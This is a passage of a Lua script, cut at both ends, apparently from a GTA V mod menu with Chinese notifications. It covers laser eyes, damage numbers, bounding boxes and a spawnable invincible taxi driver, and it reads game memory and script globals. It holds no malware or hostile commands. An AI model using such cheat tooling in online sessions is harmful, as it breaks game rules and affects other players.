        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        camAim_x, camAim_y, camAim_z = v3.get(inst)
        local ped_model = ENTITY.GET_ENTITY_MODEL(players.user_ped())
        local left_eye_id = 0
        local right_eye_id = 0
        pluto_switch ped_model do 
            case 1885233650:
            case -1667301416:
                left_eye_id = 25260
                right_eye_id = 27474
                break
            case 225514697:
            default:
                left_eye_id = 5956
                right_eye_id = 6468
        end
        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z += 0.02
            boneCoord_R.z += 0.02
        end
        camRot.x += 90
        request_ptfx_asset_lasereyes(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
    end
end

function is_player_in_any_interior(player)
	local address = memory.script_global(2657589 + (player * 466 + 1) + 245)
	return address ~= NULL and memory.read_int(address) ~= 0
end

Features = {}
Translation = {}

---@param section string
---@param name string
---@return string
function translate(section, name)
	Features[section] = Features[section] or {}
	Features[section][name] = Features[section][name] or ""
	if Config.general.language == "english" then
		return name
	end
	Translation[section] = Translation[section] or Features[section]
	if not Translation[section][name] then
		Translation[section][name] = ""
		return name
	end
	if Translation[section][name] == "" then
		return name
	end
	return Translation[section][name]
end

--伤害数字
b_drawing_funcs = {}
b_drawing_funcs.new = function ()
    local self = {}
    self.draw_arrow = function(pos, angle, size, colour_a, colour_b)
        local angle_cos = math.cos(angle)
        local angle_sin = math.sin(angle)
    
        local width = 0.5 * size
        local length = 1 * size
        local height = 0.25 * size
    
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
    end
    self.draw_arrow_down = function(pos, angle, size, colour_a, colour_b)
        local angle_cos = math.cos(angle)
        local angle_sin = math.sin(angle)
    
        local width = 0.5 * size
        local length = 1 * size
        local height = 0.25 * size
        
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
    end
    self.draw_quad = function (pos1_org, pos2_org, size, colour_a, colour_b, dict, texture)
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dict, false)
        if GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dict) then
            pos1 =  {x = pos1_org.x, y = pos1_org.y, z = pos1_org.z}
            pos2 =  {x = pos2_org.x, y = pos2_org.y, z = pos2_org.z}
            pos2.z = pos2.z - size * 0.5
            pos1.z = pos1.z - size * 0.5
            GRAPHICS.SET_BACKFACECULLING(false)
            GRAPHICS._DRAW_SPRITE_POLY_2(
                pos1.x,     pos1.y,             pos1.z,
                pos2.x,     pos2.y,             pos2.z,
                pos2.x,     pos2.y,             pos2.z + size,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                dict,
                texture,
                0, 1, 0, 
                1, 1, 0,
                0, 0, 0
            )
              GRAPHICS._DRAW_SPRITE_POLY_2(
                pos1.x,     pos1.y,             pos1.z + size,
                pos1.x,     pos1.y,             pos1.z,
                pos2.x,     pos2.y,             pos2.z + size,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                dict,
                texture,
                0, 0, 0,
                1, 1, 0,
                1, 0, 0
            )
        else
            notification("not loaded")
        end 
    end
    self.arc_line = {}
    self.arc_line.new = function ()
        arc = {}
        arc.instability = 0.75
        arc.draw = function (pos1, pos2)
            local dif = {x = pos2.x - pos1.x, y = pos2.y - pos1.y, z = pos2.z - pos1.z}
            local distance_to_cover = math.sqrt(
                (dif.x * dif.x) +
                (dif.y * dif.y) +
                (dif.z * dif.z)
            )
            local nor_dir = {x = dif.x / distance_to_cover, y = dif.y / distance_to_cover,z = dif.z / distance_to_cover}

            for _ = 0, 3, 1 do
                local distance_covered = math.random() * 1.5
                local previous_pos = pos1
                repeat
                    local current_pos = {
                        x = pos1.x + nor_dir.x * distance_covered + (math.random() - 0.5) * arc.instability,
                        y = pos1.y + nor_dir.y * distance_covered + (math.random() - 0.5) * arc.instability,
                        z = pos1.z + nor_dir.z * distance_covered + (math.random() - 0.5) * arc.instability
                    }
                    GRAPHICS.DRAW_LINE(
                        previous_pos.x, previous_pos.y, previous_pos.z,
                        current_pos.x , current_pos.y , current_pos.z,
                        0, 255, 255, 255
                    )
                    previous_pos = current_pos
                    distance_covered = distance_covered + math.random() * 1.5
                until distance_covered > distance_to_cover
                GRAPHICS.DRAW_LINE(
                    previous_pos.x, previous_pos.y, previous_pos.z,
                    pos2.x , pos2.y , pos2.z,
                    0, 255, 255, 255
                )
            end

            arc.instability = arc.instability + (0.15 - arc.instability) *  MISC.GET_FRAME_TIME() * 7
        end
        return arc
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    local upVector_pointer = memory.alloc()
    local rightVector_pointer = memory.alloc()
    local forwardVector_pointer = memory.alloc()
    local position_pointer = memory.alloc()
    self.draw_bounding_box = function (entity, colour)
        ENTITY.GET_ENTITY_MATRIX(entity, rightVector_pointer, forwardVector_pointer, upVector_pointer, position_pointer);
        local forward_vector = memory.read_vector3(forwardVector_pointer)
        local right_vector = memory.read_vector3(rightVector_pointer)
        local up_vector = memory.read_vector3(upVector_pointer)

        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local minimum_vec = memory.read_vector3(minimum)
        local maximum_vec = memory.read_vector3(maximum)
        local dimensions = {x = maximum_vec.y - minimum_vec.y, y = maximum_vec.x - minimum_vec.x, z = maximum_vec.z - minimum_vec.z}

        local top_right =           ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity,       maximum_vec.x, maximum_vec.y, maximum_vec.z)
        local top_right_back =      {x = forward_vector.x * -dimensions.y + top_right.x,        y = forward_vector.y * -dimensions.y + top_right.y,         z = forward_vector.z * -dimensions.y + top_right.z}
        local bottom_right_back =   {x = up_vector.x * -dimensions.z + top_right_back.x,        y = up_vector.y * -dimensions.z + top_right_back.y,         z = up_vector.z * -dimensions.z + top_right_back.z}
        local bottom_left_back =    {x = -right_vector.x * dimensions.x + bottom_right_back.x,  y = -right_vector.y * dimensions.x + bottom_right_back.y,   z = -right_vector.z * dimensions.x + bottom_right_back.z}
        local top_left =            {x = -right_vector.x * dimensions.x + top_right.x,          y = -right_vector.y * dimensions.x + top_right.y,           z = -right_vector.z * dimensions.x + top_right.z}
        local bottom_right =        {x = -up_vector.x * dimensions.z + top_right.x,             y = -up_vector.y * dimensions.z + top_right.y,              z = -up_vector.z * dimensions.z + top_right.z}
        local bottom_left =         {x = forward_vector.x * dimensions.y + bottom_left_back.x,  y = forward_vector.y * dimensions.y + bottom_left_back.y,   z = forward_vector.z * dimensions.y + bottom_left_back.z}
        local top_left_back =       {x = up_vector.x * dimensions.z + bottom_left_back.x,       y = up_vector.y * dimensions.z + bottom_left_back.y,        z = up_vector.z * dimensions.z + bottom_left_back.z}

        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            bottom_left.x, bottom_left.y, bottom_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left_back.x, bottom_left_back.y, bottom_left_back.z,
            top_left_back.x, top_left_back.y, top_left_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_left_back.x, top_left_back.y, top_left_back.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_left_back.x, top_left_back.y, top_left_back.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left.x, bottom_left.y, bottom_left.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_left.x, bottom_left.y, bottom_left.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            bottom_right_back.x, bottom_right_back.y, bottom_right_back.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
    end
    local numbers = {}
    local x_coord_ptr = memory.alloc(4)
    local y_coord_ptr = memory.alloc(4)
    local draw_numbers = function ()
        util.create_tick_handler(function() 
            local delta_time = MISC.GET_FRAME_TIME()
            for i, number in ipairs(numbers) do
                if GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(number.pos.x, number.pos.y, number.pos.z, x_coord_ptr, y_coord_ptr) then
                    local x = memory.read_float(x_coord_ptr)
                    local y = memory.read_float(y_coord_ptr)
                    local alpha = math.min(1, number.time)
                    directx.draw_text(x, y, number.num, ALIGN_CENTRE, number.size, {r = number.colour.r * alpha,g = number.colour.g * alpha,b = number.colour.b * alpha,a = number.colour.a * alpha}, false)
                    number.pos.z = number.pos.z + 0.2 * delta_time
                end
                number.time = number.time - delta_time
                if number.time < 0 then
                    table.remove(numbers, i)
                end
            end
            return #numbers ~= 0
        end)
    end
    local random_offset = 1
    self.draw_damage_number = function(entity, num, colour, size)
        pos = ENTITY.GET_ENTITY_COORDS(entity)
        random_offset_pos = {x = pos.x + (math.random() * random_offset - random_offset * 0.5),y = pos.y + (math.random() * random_offset - random_offset * 0.5),z = pos.z}
        numbers[#numbers+1] = {
            pos = random_offset_pos,
            colour = colour,
            num = num,
            size = size,
            time = 3
        }
        if #numbers == 1 then
            draw_numbers()
        end
    end
        --all credit to Nowiry#2663 for this one
        self.draw_button_tip = function (buttons, duration, colour)
            function equals(l1, l2)
                if l1 == l2 then return true end
                local type1 = type(l1)
                local type2 = type(l2)
                if type1 ~= type2 then return false end
                if type1 ~= 'table' then return false end
                for k, v in pairs(l1) do
                    if not l2[ k ] or not equals(v, l2[ k ]) then
                        return false
                    end
                end
                return true
            end
            local timer = 0
            util.create_tick_handler(function ()
                local INSTRUCTIONAL = {}
            INSTRUCTIONAL.scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('instructional_buttons')
            INSTRUCTIONAL.isKeyboard = PAD._IS_USING_KEYBOARD(2)
        
            if not equals(buttons, INSTRUCTIONAL.currentsettup) or INSTRUCTIONAL.isKeyboard ~= PAD._IS_USING_KEYBOARD(2) then
                local colour = colour or {
                    ['r'] = 0,
                    ['g'] = 0,
                    ['b'] = 0
                }
        
                while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(INSTRUCTIONAL.scaleform) do
                    wait()
                end
                
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'CLEAR_ALL')
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'TOGGLE_MOUSE_BUTTONS')
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                for i = 1, #buttons do
                    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'SET_DATA_SLOT')
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(i) --position
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(2, buttons[i][2], true)) --control
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(buttons[i][1]) --name
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(buttons[i][3] or false) --clickable
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(buttons[i][2]) --what control will be pressed when you click the button
                    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                end
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'SET_BACKGROUND_COLOUR')
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.r)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.g)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.b)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(80)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'DRAW_INSTRUCTIONAL_BUTTONS')
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                INSTRUCTIONAL.currentsettup = buttons
                INSTRUCTIONAL.isKeyboard = PAD._IS_USING_KEYBOARD(2)
            end
            GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(INSTRUCTIONAL.scaleform, 255, 255, 255, 255, 0)
            if timer > duration then
                return false
            end
            timer = timer + MISC.GET_FRAME_TIME()
            return true
            end)
        end
        return self
    end

b_colour = {}
b_colour.new = function ()
    local self = {}
    self.new = function (r, g, b, a)
        return {
            r = r,
            g = g,
            b = b,
            a = a
        }
    end
    self.white =    {r = 255,g = 255,b = 255,a = 255}

    self.black =    {r = 0,g = 0,b = 0,a = 255}

    self.magenta =  {r = 255,g = 0,b = 255,a = 255}

    self.red =      {r = 255,g = 0,b = 0,a = 255}

    self.green =    {r = 0,g = 255,b = 0,a = 255}

    self.blue =     {r = 0,g = 0,b = 255,a = 255}

    self.to_rage = function (colour)
        return {
            r = math.floor(colour.r * 255),
            g = math.floor(colour.g * 255),
            b = math.floor(colour.b * 255),
            a = math.floor(colour.a * 255)
        }
    end
    self.to_stand = function (colour)
        return {
            r = colour.r / 255,
            g = colour.g / 255,
            b = colour.b / 255,
            a = colour.a / 255
        }
    end
    return self
end

colour = b_colour.new()
drawing_funcs = b_drawing_funcs.new()
damage_numbers_target_ptr = memory.alloc(4)
damage_numbers_tracked_entities = {}
damage_numbers_health_colour = colour.to_stand(colour.new(20, 180, 50, 255))
damage_numbers_armour_colour = colour.to_stand(colour.new(50, 50, 200, 255))
damage_numbers_crit_colour = colour.to_stand(colour.new(200, 200, 10, 255))
damage_numbers_vehicle_colour = colour.to_stand(colour.new(200, 100, 20, 255))
damage_numbers_bone_ptr = memory.alloc(4)
damage_numbers_text_size = 0.700000
damage_numbers_target_vehicles = damage_numbers_text_size
function damage_numbers()
   if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), damage_numbers_target_ptr) then
        local target = memory.read_int(damage_numbers_target_ptr)
        if ENTITY.IS_ENTITY_A_PED(target) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(target, false)
            if vehicle ~= 0 and damage_numbers_target_vehicles then
                if damage_numbers_tracked_entities[vehicle] == nil then
                    damage_numbers_tracked_entities[vehicle] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(vehicle)),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[vehicle].timer = 1
                end
            end
                if damage_numbers_tracked_entities[target] == nil then
                    damage_numbers_tracked_entities[target] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target) - 100),
                        armour = PED.GET_PED_ARMOUR(target),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[target].timer = 1
                end
        elseif ENTITY.IS_ENTITY_A_VEHICLE(target) and damage_numbers_target_vehicles then
            if damage_numbers_tracked_entities[target] == nil then
                damage_numbers_tracked_entities[target] = {
                    health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target)),
                    timer = 1
                }
            else
                damage_numbers_tracked_entities[target].timer = 1
            end
        end
   end
   for entity, data in pairs(damage_numbers_tracked_entities) do
        if  ENTITY.IS_ENTITY_A_PED(entity) then
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity) - 100)
            local current_armour = PED.GET_PED_ARMOUR(entity)
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, PLAYER.PLAYER_PED_ID(), 1) then
                if current_health < data.health then
                    data.timer = 1
                    PED.GET_PED_LAST_DAMAGE_BONE(entity, damage_numbers_bone_ptr)
                    if memory.read_int(damage_numbers_bone_ptr) == 31086 then
                        drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_crit_colour, damage_numbers_text_size)
                    else
                        drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_health_colour, damage_numbers_text_size)
                    end
                end
                if current_armour < data.armour then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.armour - current_armour, damage_numbers_armour_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - MISC.GET_FRAME_TIME()
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
            data.armour = current_armour
        else
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity))
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, PLAYER.PLAYER_PED_ID(), 1) then
                if current_health < data.health then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_vehicle_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - MISC.GET_FRAME_TIME()
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
        end
    end
end

function Vspawn(mod, pCoor, pedSi, plate)
    Streament(mod)
   local vmod = VEHICLE.CREATE_VEHICLE(mod, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
    PED.SET_PED_INTO_VEHICLE(pedSi, vmod, -1)
    VEHICLE.SET_VEHICLE_COLOURS(vmod, math.random(0, 160), math.random(0, 160))
    Vmod(vmod, plate)
    local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
    ENTITY.SET_ENTITY_HEADING(vmod, CV)
end

function get_vehicle_model_info(modelHash)
	return util.call_foreign_function(GetVehicleModelInfo, modelHash, NULL)
end

function get_vehicle_model_handling_data(modelInfo)
	return util.call_foreign_function(GetHandlingDataFromIndex, memory.read_uint(modelInfo + 0x4B8))
end

local taxi_ped = 0
local taxi_veh = 0
local taxi_blip = -1

function summ_car(index, value)
    
    local vhash = util.joaat(value)
    local phash = util.joaat("s_m_y_casino_01")

    if taxi_veh ~= 0 then
        entities.delete_by_handle(taxi_veh)
    end

    if taxi_ped ~= 0 then
        util.remove_blip(taxi_blip)
        entities.delete_by_handle(taxi_ped)
    end 

    local plyr = players.user_ped()
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 5.0, 0.0)
    request_model_load(vhash)
    request_model_load(phash)
    taxi_veh = entities.create_vehicle(vhash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
    max_out_car(taxi_veh)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(taxi_veh, "LANCE")
    VEHICLE.SET_VEHICLE_COLOURS(taxi_veh, 145, 145)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_veh, true)
    --local my_rel_hash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(players.user_ped())
    taxi_ped = entities.create_ped(32, phash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(taxi_ped, util.joaat("rgFM_AiLike"))
    taxi_blip = HUD.ADD_BLIP_FOR_ENTITY(taxi_ped)
    HUD.SET_BLIP_COLOUR(taxi_blip, 7)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_ped, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(taxi_ped, true)
    PED.SET_PED_FLEE_ATTRIBUTES(taxi_ped, 0, false)
    PED.SET_PED_CAN_BE_DRAGGED_OUT(taxi_ped, false)
    VEHICLE.SET_VEHICLE_EXCLUSIVE_DRIVER(taxi_veh, taxi_ped, -1)
    PED.SET_PED_INTO_VEHICLE(taxi_ped, taxi_veh, -1)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_ped, true)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), taxi_veh, 0)
    notification("您的司机已创建！", colors.blue)
end

function summ_car_topoint()
    if taxi_ped == 0 then
        notification("你没有生成司机.")
    else
        local goto_coords = get_waypoint_coords()
        if goto_coords ~= nil then
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(taxi_ped, taxi_veh, goto_coords['x'], goto_coords['y'], goto_coords['z'], 300.0, 786996, 5)
        end
    end
end

function summ_car_tp()
    if taxi_ped == 0 then
        notification("你没有生成司机.", colors.blue)
    else
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), taxi_veh, 0)
    end
end

function summ_car_bmob()
    if taxi_ped == 0 then
        notification("你没有生成司机.", colors.blue)
    else
        local ped_copy = taxi_ped
        local veh_copy = taxi_veh
        taxi_ped = 0
        taxi_veh = 0
        local coords = ENTITY.GET_ENTITY_COORDS(veh_copy)
        ENTITY.SET_ENTITY_INVINCIBLE(veh_copy, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 100.0, true, false, 1.0)
        ENTITY.SET_ENTITY_HEALTH(veh_copy, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped_copy, false)
        ENTITY.SET_ENTITY_HEALTH(ped_copy, 0)
        if math.random(5) == 3 then
            notification("他有老婆孩子...", colors.blue)
        end
        wait(3000)
        entities.delete_by_handle(ped_copy)
        entities.delete_by_handle(veh_copy)
    end
end

local careffects = {
	{"scr_rcbarry1", "scr_alien_impact_bul", 1.0, 50},
